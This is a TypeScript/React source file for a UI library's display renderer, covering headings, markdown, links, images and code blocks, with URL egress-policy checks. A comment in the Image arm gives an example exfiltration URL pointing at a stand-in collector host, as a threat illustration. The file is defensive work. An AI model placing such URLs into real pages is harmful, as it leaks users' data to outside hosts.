// ============================================================================
//  @fuaran-ui/renderer/render/Display — every DisplayKind variant.
//  Mirrors the F# renderDisplay: Heading / Markdown / KPI / Badge /
//  Skeleton / Callout / Progress / Sparkline / LabelValueRow. Markdown routes
//  through the sanitising parser (NOT raw dangerouslySetInnerHTML) per Phase 56.
// ============================================================================

import type { ReactElement, ReactNode } from 'react';

import type {
  CalloutSpec,
  DisplayKind,
  ErrorPayload,
  HeadingSpec,
  MetricSpec,
  LabelValueRowSpec,
  ProgressSpec,
  SparklineSpec,
  StateBehaviour,
} from '@fuaran-ui/schema';

import {
  asArray,
  formatNumber,
  renderText,
  resolve,
  resolveScalarFloat,
  type Resolution,
  tryResolve,
  tryResolveScalarFloat,
} from '../bindings.js';
import { imageAspectClass, toneVar, trendSentiment } from '../classNames.js';
import type { RenderContext } from '../context.js';
import { drawingSvg } from '../drawingSvg.js';
import { mathMl } from '../mathMl.js';
import { sanitizeUrlForEgress } from '../egress.js';
import { toHtmlWithEgress } from '../markdown.js';
import { renderNode } from './core.js';
import { iconHook } from './iconHook.js';

let counter = 0;
const correlationId = (): string => {
  counter += 1;
  return `d${counter.toString(36)}`;
};

const bindingResolutionError = (message: string): ErrorPayload => ({
  kind: 'BindingResolution',
  message,
  correlationId: correlationId(),
});

/** Resolved-value text for Metric / LabelValueRow value slots (mirrors F#). */
const resolvedValueText = (
  resolution: Resolution<number>,
  format: MetricSpec['format'],
): string => {
  switch (resolution.kind) {
    case 'Resolved':
      return formatNumber(format, resolution.value);
    case 'NotResolved':
      return '—';
    case 'Errored':
      return `(error: ${resolution.message})`;
    case 'I18nUnresolved':
      return `[i18n:${resolution.key}]`;
  }
};

export const renderDisplay = <TMsg,>(
  ctx: RenderContext<TMsg>,
  state: StateBehaviour<TMsg>,
  display: DisplayKind,
  // Phase 951 — the node's a11y projection, for the kinds whose body IS the
  // node's semantic element (here: Link and Image). `{}` everywhere else.
  semanticAttrs: Record<string, string> = {},
): ReactNode => {
  switch (display.kind) {
    case 'Heading':
      return renderHeading(ctx, display.spec);

    case 'Markdown':
      // Phase 1037 — the markdown body's own links and images are destinations
      // like any other, so the body is rendered under the SAME ambient policy
      // the `Link` / `Image` arms below consult. The pure `toHtml` survives as
      // the permissive case; reaching it from here would have left a decoded
      // markdown body as the one unpoliced egress surface in the renderer.
      return (
        <div
          className="fuaran-markdown"
          dangerouslySetInnerHTML={{
            __html: toHtmlWithEgress(ctx.egressPolicy, renderText(ctx.sources, display.spec.text)),
          }}
        />
      );

    case 'Metric':
      return renderMetric(ctx, state, display.spec);

    case 'Badge':
      return (
        <span className={`fuaran-badge fuaran-badge-${display.spec.variant.toLowerCase()}`}>
          {renderText(ctx.sources, display.spec.label)}
        </span>
      );

    case 'Skeleton':
      return (
        <div className="fuaran-skeleton">
          {Array.from({ length: display.spec.rows }, (_, i) => (
            <div key={i} className="fuaran-skeleton-row" />
          ))}
        </div>
      );

    case 'Icon': {
      // Phase 821 — the standalone icon-only display kind. The glyph NAME
      // rides `data-icon` (the uniform icon-hook contract — no text content,
      // hosts map it to glyphs); size + tone are modifier classes. A11y:
      // decorative (no label) emits `aria-hidden="true"`; labelled emits
      // `role="img"` + `aria-label`. Mirrors the F# renderers byte-for-byte.
      const spec = display.spec;
      const className = `fuaran-icon fuaran-icon--${spec.size.toLowerCase()} fuaran-icon-${toneVar(
        spec.tone,
      )}`;
      return spec.label !== undefined ? (
        <span className={className} data-icon={spec.icon} role="img" aria-label={spec.label} />
      ) : (
        <span className={className} data-icon={spec.icon} aria-hidden="true" />
      );
    }

    case 'Callout':
      return renderCallout(ctx, display.spec);

    case 'Progress':
      return renderProgress(ctx, state, display.spec);

    case 'Sparkline':
      return renderSparkline(ctx, display.spec);

    case 'Drawing':
      // Phase 525 — first-party inline SVG from the canonical builder (the ONE
      // serialisation the string server renderer also emits, so the class sets
      // are parity by construction). Rides dangerouslySetInnerHTML like Markdown.
      return <div dangerouslySetInnerHTML={{ __html: drawingSvg(ctx.sources, display.spec) }} />;

    case 'LabelValueRow':
      return renderLabelValueRow(ctx, state, display.spec);

    case 'Fact': {
      // A labeled TEXT fact tile — Metric's chrome for a TextSource value;
      // renderText resolves Literal/Bound/I18n as for every label.
      const spec = display.spec;
      const emphasisSuffix = spec.emphasis ? ' fuaran-fact-emphasis' : '';
      return (
        <div className={`fuaran-fact fuaran-fact-${toneVar(spec.tone)}${emphasisSuffix}`}>
          <div className="fuaran-fact-label">{renderText(ctx.sources, spec.label)}</div>
          <div className="fuaran-fact-value">
            {spec.icon !== undefined ? iconHook('fuaran-fact-icon', spec.icon) : null}
            <span>{renderText(ctx.sources, spec.value)}</span>
          </div>
          {spec.help !== undefined ? (
            <div className="fuaran-fact-help">{renderText(ctx.sources, spec.help)}</div>
          ) : null}
        </div>
      );
    }

    case 'Link': {
      // Phase 951 — this arm's element IS the node, so the node's a11y
      // projection (and the aria-* half of its extraAttributes) spreads onto it
      // rather than onto the wrapper div.
      // A real <a href> — crawlable + works with JS disabled. rel/target emit
      // when set; download emits a bare attr.
      //
      // Phase 1037 — href resolves the binding then passes through the AMBIENT
      // destination policy in the `hyperlink` class. The scheme floor still
      // runs (it is the first thing `checkDestination` does), but it only
      // decides whether this URL is safe to HAVE; the policy decides whether
      // this tree may point at that host AT ALL. A refused href renders as
      // `about:blank#fuaran-egress-refused` carrying the class + host, so the
      // refusal is visible in the document rather than only in the logs.
      //
      // `download` is deliberately NOT the class here even when
      // `spec.download` is set: the class names the SINK the browser reaches,
      // and a `download` anchor is still a hyperlink the user must act on.
      // Scoping it separately would let a policy that denied hyperlinks admit
      // the same destination by flipping one boolean on the tree.
      const [href, egressAttrs] = sanitizeUrlForEgress(
        ctx.egressPolicy,
        'hyperlink',
        tryResolve(ctx.sources, display.spec.href) ?? '',
      );
      if (display.spec.protection === 'email' && href.startsWith('mailto:')) {
        // Phase 812 — protected email link, client side. The client DOM is
        // assembled at runtime (nothing scrapes a hydrated DOM that the server
        // document did not already reveal), so the real href is set directly;
        // the wrapper span + protected class mirror the server structure so
        // the post-entity-decode DOMs are identical.
        // Phase 951 — the projection lands on the wrap <span>, not the inner
        // anchor: the server tier builds that anchor as an entity-encoded
        // opaque string and cannot reach inside it, and client/server parity
        // outranks reaching one tier's anchor.
        return (
          <span className="fuaran-link-protected-wrap" {...semanticAttrs}>
            <a className="fuaran-link fuaran-link-protected" href={href}>
              {renderText(ctx.sources, display.spec.label)}
            </a>
          </span>
        );
      }
      // The refusal marker rides the element that carries the refused href, so
      // a reader of the DOM sees WHY this anchor points at about:blank. Empty
      // on an allow.
      return (
        <a
          className="fuaran-link"
          href={href}
          {...(display.spec.rel !== undefined ? { rel: display.spec.rel } : {})}
          {...(display.spec.target !== undefined ? { target: display.spec.target } : {})}
          {...(display.spec.download ? { download: '' } : {})}
          {...semanticAttrs}
          {...Object.fromEntries(egressAttrs)}
        >
          {renderText(ctx.sources, display.spec.label)}
        </a>
      );
    }

    case 'Image': {
      // A real <img> (Phase 287). alt is mandatory; variant appends an Avatar /
      // Rounded class.
      //
      // Phase 1037 — `src` is the `media` class, and it is the one that matters
      // most: the browser fetches it with NO user act, so RENDERING the tree IS
      // the request. `https://collector.example/?s=<bound state>` passes every
      // scheme check in `sanitize.ts` — allowlisted scheme, well-formed host,
      // no script anywhere — and exfiltrates on sight. Only the origin
      // allowlist closes it, which is why the ambient default denies rather
      // than waiting to be asked.
      const [src, egressAttrs] = sanitizeUrlForEgress(
        ctx.egressPolicy,
        'media',
        tryResolve(ctx.sources, display.spec.src) ?? '',
      );
      const variantClass =
        display.spec.variant === 'Avatar'
          ? 'fuaran-image fuaran-image-avatar'
          : display.spec.variant === 'Rounded'
            ? 'fuaran-image fuaran-image-rounded'
            : 'fuaran-image';
      // Phase 1077 — the presentation tokens map to classes and nothing else:
      // no value from the tree ever reaches a style attribute. `Natural` emits
      // NO class on either axis, so a pre-phase tree's class attribute is
      // byte-identical. Byte-parity with the server arm is the contract — keep
      // the two mappings in step.
      const fitClass =
        display.spec.fit === 'Cover'
          ? ' fuaran-image-fit-cover'
          : display.spec.fit === 'Contain'
            ? ' fuaran-image-fit-contain'
            : '';
      const aspectClass = imageAspectClass(display.spec.aspectRatio);
      // Phase 1077 — `Eager` emits no attribute at all (the browser default);
      // only `Lazy` is a declaration. Deferring an above-the-fold image is a
      // regression, which is why the default is not the "optimised" value.
      const loadingAttrs = display.spec.loading === 'Lazy' ? { loading: 'lazy' as const } : {};
      // Phase 1080 — the responsive candidate list, byte-parity with the server
      // arm. Every candidate goes through the SAME `media`-class egress seam the
      // primary `src` does: a srcset candidate is a URL the browser fetches with
      // no user act, which is the exact class this floor exists for, so routing
      // only the primary through it would make the slot a documented way around
      // the one rule this node has. A refused candidate is DROPPED rather than
      // neutered — the primary `src` must exist so it collapses to the refusal
      // URL, but a candidate has no such obligation, and a rendition that cannot
      // load is worse than one fewer. Ascending by width is the RENDERER's
      // canonicalisation; the wire keeps authored order.
      const srcSetCandidates = [...display.spec.srcSet]
        .sort((a, b) => a.width - b.width)
        .flatMap((entry) => {
          const [safe, refusal] = sanitizeUrlForEgress(
            ctx.egressPolicy,
            'media',
            tryResolve(ctx.sources, entry.src) ?? '',
          );
          return safe === '' || refusal.length > 0 ? [] : [`${safe} ${entry.width}w`];
        });
      // `sizes` is the one bounded value the tree can justify: nothing in the
      // document says how wide this element will be laid out, and the language
      // has no media-query slot for an author to say so.
      const srcSetAttrs =
        srcSetCandidates.length > 0 ? { srcSet: srcSetCandidates.join(', '), sizes: '100vw' } : {};
      // Phase 951 — the a11y projection lands on the <img> itself.
      const img = (
        <img
          className={variantClass + fitClass + aspectClass}
          src={src}
          alt={renderText(ctx.sources, display.spec.alt)}
          {...srcSetAttrs}
          {...loadingAttrs}
          {...semanticAttrs}
          {...Object.fromEntries(egressAttrs)}
        />
      );
      // Phase 1078 — the caption. Absent returns the <img> UNTOUCHED, which is
      // the acceptance criterion expressed as control flow rather than as a
      // claim: there is no wrapper to be byte-identical to, because there is no
      // wrapper. Present wraps it in the semantic pair — an ad-hoc sibling text
      // node carried the same pixels and no binding, so assistive technology
      // read it as the next paragraph. Nothing moves onto the <figure>.
      // Phase 1079 — the expansion affordance, byte-parity with the server arm.
      // The renderer emits an INERT anchor and attaches nothing: the overlay is
      // a separate, opt-in, post-hydration pass over `[data-fuaran-expandable]`
      // (`@fuaran-ui/renderer/enhance-expandable`), exactly the
      // deterministic-floor / client-only-enhancement split `CodeBlock` and
      // `Math` already run on. An `onClick` here instead would put behaviour in
      // the parity-checked output AND give the no-JS reader nothing.
      //
      // A refused `src` emits NO anchor: the `<img>`'s `src` must exist so it
      // collapses to the refusal URL, but an anchor has no such obligation, and
      // `<a href="about:blank">` is exactly the dead control this design avoids.
      //
      // `data-fuaran-expandable` is VALUELESS (the empty string) because the
      // slot is a bool whose `false` is the absence of the attribute — unlike
      // `data-fuaran-sortable`, which carries a value because a table has three
      // states under a host's broad default.
      const expandable =
        display.spec.expandable && src !== '' && egressAttrs.length === 0 ? (
          <a className="fuaran-image-expand" href={src} data-fuaran-expandable="">
            {img}
          </a>
        ) : (
          img
        );
      // Phase 1079 — `<figure>` wraps `<a>` wraps `<img>`: the caption is
      // OUTSIDE the link target. It is prose a reader selects and quotes, not a
      // second click surface, and interactive content inside the element whose
      // job is to LABEL the image inverts the figure/figcaption relationship.
      if (display.spec.caption === undefined) return expandable;
      return (
        <figure className="fuaran-image-figure">
          {expandable}
          <figcaption className="fuaran-image-figure-caption">
            {renderText(ctx.sources, display.spec.caption)}
          </figcaption>
        </figure>
      );
    }

    case 'List': {
      // <ol> (ordered) / <ul> (unordered) of <li> items (Phase 287).
      const items = display.spec.items.map((item, i) => (
        <li key={i} className="fuaran-list-item">
          {renderText(ctx.sources, item)}
        </li>
      ));
      return display.spec.ordered ? (
        <ol className="fuaran-list fuaran-list-ordered">{items}</ol>
      ) : (
        <ul className="fuaran-list fuaran-list-unordered">{items}</ul>
      );
    }

    case 'Toast': {
      // Phase 289 overlay render-fidelity contract: ALWAYS in the DOM (no
      // portal); closed = the `hidden` attribute. role="status" +
      // aria-live="polite" announce the message without interrupting.
      const isOpen = tryResolve(ctx.sources, display.spec.open) === true;
      const toneClass = toneVar(display.spec.tone);
      return (
        <div
          className={`fuaran-toast fuaran-toast-${toneClass}`}
          role="status"
          aria-live="polite"
          {...(!isOpen ? { hidden: true } : {})}
        >
          <span className="fuaran-toast-message">
            {renderText(ctx.sources, display.spec.message)}
          </span>
          {display.spec.dismissable ? (
            <button className="fuaran-toast-dismiss" type="button" aria-label="Dismiss">
              ×
            </button>
          ) : null}
        </div>
      );
    }

    case 'CodeBlock': {
      // Phase 290 — DETERMINISTIC <pre><code> (HTML-escaped by React, NO markdown
      // library), byte-identical across hosts + SSR. Syntax highlighting is a
      // client-only post-hydration enhancement that targets the `language-{x}`
      // class — explicitly NOT emitted here (outside the parity output). Line
      // numbers + highlight ranges are deterministic class / data hooks.
      const spec = display.spec;
      const containerClass = spec.lineNumbers
        ? 'fuaran-codeblock fuaran-codeblock-numbered'
        : 'fuaran-codeblock';
      const highlightAttr =
        spec.highlightLines.length > 0
          ? { 'data-highlight-lines': spec.highlightLines.join(',') }
          : {};
      return (
        <div className={containerClass} data-language={spec.language} {...highlightAttr}>
          {spec.copyable ? (
            <button className="fuaran-codeblock-copy" type="button" aria-label="Copy">
              Copy
            </button>
          ) : null}
          <pre className="fuaran-codeblock-pre">
            <code className={`fuaran-codeblock-code language-${spec.language}`}>{spec.code}</code>
          </pre>
        </div>
      );
    }

    case 'Math': {
      // Phase 658 — DETERMINISTIC native MathML for the closed subset (real
      // superscripts with NO JavaScript), or the raw escaped-source span for
      // out-of-subset input. `mathMl` is byte-identical to the F# renderer (and
      // the server renderer imports the same builder). KaTeX upgrades either
      // shape client-only post-hydration (targets the `.fuaran-math` container,
      // reads `data-fuaran-math-src`), OUTSIDE the parity output. See
      // fuaran-dotnet/docs/MATH-DEGRADATION.md.
      const spec = display.spec;
      const markup = mathMl(spec.source, spec.display);
      const isBlock = spec.display === 'Block';
      const className = isBlock
        ? 'fuaran-math fuaran-math-block'
        : 'fuaran-math fuaran-math-inline';
      const dataDisplay = isBlock ? 'block' : 'inline';
      if (markup !== null) {
        return isBlock ? (
          <div
            className={className}
            data-math-display={dataDisplay}
            data-fuaran-math-src={spec.source}
            dangerouslySetInnerHTML={{ __html: markup }}
          />
        ) : (
          <span
            className={className}
            data-math-display={dataDisplay}
            data-fuaran-math-src={spec.source}
            dangerouslySetInnerHTML={{ __html: markup }}
          />
        );
      }
      const sourceSpan = <span className="fuaran-math-source">{spec.source}</span>;
      return isBlock ? (
        <div
          className={className}
          data-math-display={dataDisplay}
          data-fuaran-math-src={spec.source}
        >
          {sourceSpan}
        </div>
      ) : (
        <span
          className={className}
          data-math-display={dataDisplay}
          data-fuaran-math-src={spec.source}
        >
          {sourceSpan}
        </span>
      );
    }
  }
};

const renderHeading = <TMsg,>(ctx: RenderContext<TMsg>, spec: HeadingSpec): ReactElement => {
  const variantSuffix =
    spec.variant === 'Eyebrow'
      ? ' fuaran-heading-eyebrow'
      : spec.variant === 'Caption'
        ? ' fuaran-heading-caption'
        : spec.variant === 'Lead'
          ? ' fuaran-heading-lead'
          : '';
  const className = `fuaran-heading${variantSuffix}`;
  const text = renderText(ctx.sources, spec.text);
  const level = spec.level;
  switch (level) {
    case 1:
      return <h1 className={className}>{text}</h1>;
    case 2:
      return <h2 className={className}>{text}</h2>;
    case 3:
      return <h3 className={className}>{text}</h3>;
    case 4:
      return <h4 className={className}>{text}</h4>;
    case 5:
      return <h5 className={className}>{text}</h5>;
    default:
      return <h6 className={className}>{text}</h6>;
  }
};

const renderMetric = <TMsg,>(
  ctx: RenderContext<TMsg>,
  state: StateBehaviour<TMsg>,
  spec: MetricSpec,
): ReactNode => {
  // Phase 632 — the Metric value is a scalar slot: a `Binding.Transform`
  // resolves to its 1×1 result cell (a global aggregate / row-field lookup).
  const resolution = resolveScalarFloat(ctx.sources, spec.value);
  if (resolution.kind === 'NotResolved' && state.onLoading !== undefined) {
    return renderNode(ctx, state.onLoading);
  }
  if (resolution.kind === 'Errored' && state.onError !== undefined) {
    return renderNode(ctx, state.onError(bindingResolutionError(resolution.message)));
  }
  return (
    <div className={`fuaran-metric fuaran-metric-${toneVar(spec.tone)}`}>
      {spec.icon !== undefined ? iconHook('fuaran-metric-icon', spec.icon) : null}
      <div className="fuaran-metric-label">{renderText(ctx.sources, spec.label)}</div>
      <div className="fuaran-metric-value">{resolvedValueText(resolution, spec.format)}</div>
      {spec.trend !== undefined &&
        (() => {
          // Phase 867 — the trend element carries a SENTIMENT, not a constant.
          // `tone` above still colours the tile; this says which way the quantity
          // moved, and nothing derives one from the other. The numeric text —
          // sign included — is unchanged.
          const t = tryResolveScalarFloat(ctx.sources, spec.trend);
          if (t === undefined) return <div className="fuaran-metric-trend"></div>;
          const [sentiment, glyph] = trendSentiment(spec.trendPolarity, t);
          return (
            <div className={`fuaran-metric-trend fuaran-metric-trend-${sentiment}`}>
              <span className="fuaran-metric-trend-glyph" role="img" aria-label={sentiment}>
                {glyph}
              </span>
              {formatNumber(spec.trendFormat ?? { kind: 'None' }, t)}
            </div>
          );
        })()}
      {spec.subtext !== undefined && (
        <div className="fuaran-metric-subtext">{renderText(ctx.sources, spec.subtext)}</div>
      )}
    </div>
  );
};

const renderCallout = <TMsg,>(ctx: RenderContext<TMsg>, spec: CalloutSpec): ReactElement => (
  <div className={`fuaran-callout fuaran-callout-${toneVar(spec.tone)}`}>
    {spec.icon !== undefined ? iconHook('fuaran-callout-icon', spec.icon) : null}
    {spec.heading !== undefined && (
      <div className="fuaran-callout-heading">{renderText(ctx.sources, spec.heading)}</div>
    )}
    <div className="fuaran-callout-body">{renderText(ctx.sources, spec.body)}</div>
    {spec.dismissable ? (
      <button className="fuaran-callout-dismiss" aria-label="Dismiss">
        ×
      </button>
    ) : null}
  </div>
);

const renderProgress = <TMsg,>(
  ctx: RenderContext<TMsg>,
  state: StateBehaviour<TMsg>,
  spec: ProgressSpec,
): ReactNode => {
  const resolution = resolve(ctx.sources, spec.fraction);
  if (resolution.kind === 'NotResolved' && state.onLoading !== undefined) {
    return renderNode(ctx, state.onLoading);
  }
  if (resolution.kind === 'Errored' && state.onError !== undefined) {
    return renderNode(ctx, state.onError(bindingResolutionError(resolution.message)));
  }
  const fraction = resolution.kind === 'Resolved' ? resolution.value : 0;
  const indeterminate = spec.indeterminate ? ' fuaran-progress-indeterminate' : '';
  return (
    <div className={`fuaran-progress fuaran-progress-${toneVar(spec.tone)}${indeterminate}`}>
      {spec.label !== undefined && (
        <div className="fuaran-progress-label">{renderText(ctx.sources, spec.label)}</div>
      )}
      <div className="fuaran-progress-bar">
        <div className="fuaran-progress-fill" style={{ width: `${fraction * 100}%` }} />
      </div>
      {spec.caveat !== undefined && (
        <div className="fuaran-progress-caveat">{renderText(ctx.sources, spec.caveat)}</div>
      )}
    </div>
  );
};

const renderLabelValueRow = <TMsg,>(
  ctx: RenderContext<TMsg>,
  state: StateBehaviour<TMsg>,
  spec: LabelValueRowSpec,
): ReactNode => {
  // Phase 632 — a scalar slot: Transform resolves to its 1×1 result cell.
  const resolution = resolveScalarFloat(ctx.sources, spec.value);
  if (resolution.kind === 'NotResolved' && state.onLoading !== undefined) {
    return renderNode(ctx, state.onLoading);
  }
  if (resolution.kind === 'Errored' && state.onError !== undefined) {
    return renderNode(ctx, state.onError(bindingResolutionError(resolution.message)));
  }
  const emphasisSuffix = spec.emphasis ? ' fuaran-label-value-row-emphasis' : '';
  return (
    <div className={`fuaran-label-value-row${emphasisSuffix}`}>
      <div className="fuaran-label-value-row-label-block">
        <span className="fuaran-label-value-row-label">{renderText(ctx.sources, spec.label)}</span>
        {spec.help !== undefined && (
          <span className="fuaran-label-value-row-help">{renderText(ctx.sources, spec.help)}</span>
        )}
      </div>
      <span className="fuaran-label-value-row-value">
        {resolvedValueText(resolution, spec.format)}
      </span>
    </div>
  );
};

const renderSparkline = <TMsg,>(ctx: RenderContext<TMsg>, spec: SparklineSpec): ReactElement => {
  const series = asArray<number>(tryResolve(ctx.sources, spec.source));
  if (series.length === 0) {
    return <div className="fuaran-sparkline fuaran-sparkline-empty">—</div>;
  }
  const values = [...series];
  const n = values.length;
  const minV = Math.min(...values);
  const maxV = Math.max(...values);
  const range = maxV - minV < 1e-9 ? 1 : maxV - minV;
  const points = values
    .map((v, i) => {
      const x = n <= 1 ? 50 : (i / (n - 1)) * 100;
      const y = 30 - ((v - minV) / range) * 28 - 1;
      return `${x.toFixed(2)},${y.toFixed(2)}`;
    })
    .join(' ');
  return (
    <svg className="fuaran-sparkline" viewBox="0 0 100 30" preserveAspectRatio="none">
      <polyline
        className="fuaran-sparkline-line"
        fill="none"
        stroke="currentColor"
        strokeWidth={1.5}
        points={points}
      />
    </svg>
  );
};
